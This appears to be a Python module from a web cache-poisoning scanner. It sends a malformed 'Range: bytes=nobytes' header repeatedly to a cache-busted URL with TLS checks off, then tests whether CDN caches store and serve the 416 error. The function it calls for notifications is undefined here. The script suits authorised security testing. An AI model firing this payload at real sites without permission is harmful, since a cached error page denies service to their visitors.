#! /usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import traceback
import sys

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def range_error_check(url):
    print("\033[36m ├ Range Header analyse\033[0m")
    
    url = "{}?cb_range=123".format(url)
    hit_verify = False
    hit_rr = ""

    header_range = {
    "Range": "bytes=nobytes"
    }
    
    req_range = False


    for i in range(10):
        try:
            req_range = requests.get(url, verify=False, headers=header_range, timeout=10)
        except:
            pass
            #print("Error with Range: bytes=nobytes header")

    if req_range:
        if req_range.status_code == 416:
            print("\033[36m --├\033[0m 416 - {} [{} bytes]".format(url, len(req_range.content)))
            for rr in req_range.headers:
                if "Cache-Status" in rr or "X-Cache" in rr or "x-drupal-cache" in rr or "X-Proxy-Cache" in rr or "X-HS-CF-Cache-Status" in rr \
                    or "X-Vercel-Cache" in rr or "X-nananana" in rr or "x-vercel-cache" in rr or "X-TZLA-EDGE-Cache-Hit" in rr or "x-spip-cache" in rr \
                    or "x-nextjs-cache" in rr:
                    hit_verify = True
                    hit_rr = rr
            if hit_verify:
                print("\033[36m --├\033[0m Range header seem's to be cached with a 416 response code with this payload: {}".format(header_range))
                req_verify = requests.get(url, verify=False, timeout=10)
                print(url)
                print(req_range.headers)
                if req_verify.status_code == 416:
                    print("  \033[31m └── VULNERABILITY CONFIRMED\033[0m | 416 STATUS-CODE cached | \033[34m{}\033[0m | PAYLOAD: Range: bytes=nobytes".format(url))
                    vuln_found_notify(url, header_range)
        elif req_range.status_code == 202:
            print("plop 202")
        else:
            pass

if __name__ == '__main__':
    url = sys.argv[1]
    range_error_check(url)